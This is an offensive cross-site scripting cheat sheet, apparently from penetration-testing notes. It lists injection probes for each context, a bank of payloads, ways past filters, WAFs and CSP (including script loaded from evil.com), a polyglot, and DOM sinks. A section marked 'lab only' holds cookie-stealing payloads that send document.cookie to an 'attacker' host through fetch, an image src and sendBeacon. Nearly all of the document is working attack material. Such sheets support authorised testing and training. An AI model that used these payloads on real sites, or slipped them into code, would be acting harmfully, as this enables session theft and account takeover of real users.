# XSS

## Context first

The payload depends on **where** your input lands:

| Context | Example sink | Minimal probe |
| --- | --- | --- |
| HTML body | `<div>INPUT</div>` | `<script>alert(1)</script>` |
| HTML attribute | `<input value="INPUT">` | `"><svg onload=alert(1)>` |
| JS string | `var x = "INPUT"` | `";alert(1);//` |
| URL/href | `<a href="INPUT">` | `javascript:alert(1)` |
| CSS | `<style>color:INPUT</style>` | `expression(alert(1))` (old IE) |
| JSON embedded in script | `var o = {k:"INPUT"}` | `";alert(1);//` |

Always view-source first and find the exact character you need to break out of.

## Payload bank

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>
<iframe srcdoc="<script>alert(1)</script>">
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
"><svg onload=alert(1)>
'-alert(1)-'
javascript:alert(1)
<a href="javascript:alert(1)">x</a>
```

## Filter bypass

| Filter | Bypass |
| --- | --- |
| `<script>` stripped | `<ScRipT>`, `<script src=//evil.com/x>` |
| `on*` stripped | SVG `<svg><set/onbegin=...>`, `<style>@keyframes` |
| `()` blocked | `onerror=alert\`1\`` (template literal) |
| `alert` blocked | `prompt`, `confirm`, `[].constructor.constructor('alert(1)')()` |
| Quotes stripped | `onerror=alert(1)` without quotes, `<svg onload=alert(1)>` |
| Whitespace stripped | `/` as separator: `<img/src/onerror=alert(1)>` |
| Case-sensitive block | mixed case, HTML entities `&#x3C;script&#x3E;` |
| CSP blocks inline | `<script src=https://evil.com/x.js>`, dangling markup, JSONP endpoints |
| WAF regex | `<%00script>`, polyglots |

## Polyglots

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Mario Heiderich's omnipresent one — works in many contexts.

## DOM XSS

Dangerous sinks: `innerHTML`, `outerHTML`, `document.write`, `eval`, `setTimeout(str, …)`, `location`, `jQuery(selector_from_user_input)`.

Sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`.

Grep for `innerHTML\s*=` or `document\.write`.

## Exfiltration (lab only)

```html
<script>fetch('//attacker/?c='+document.cookie)</script>
<img src=x onerror="this.src='//attacker/?c='+document.cookie">
<svg><script>navigator.sendBeacon('//attacker/',document.cookie)</script></svg>
```

For HttpOnly cookies: steal CSRF tokens or make auth'd requests on behalf of victim instead.

## CSP

Dump the policy: `curl -I target | grep -i content-security`. Weak signs: `unsafe-inline`, `unsafe-eval`, wildcards, trusted CDNs that host JSONP.

## Offline reference

```bash
ls /opt/tools/PayloadsAllTheThings/XSS\ Injection/
rg -n 'csp bypass' /opt/tools/HackTricks/
```
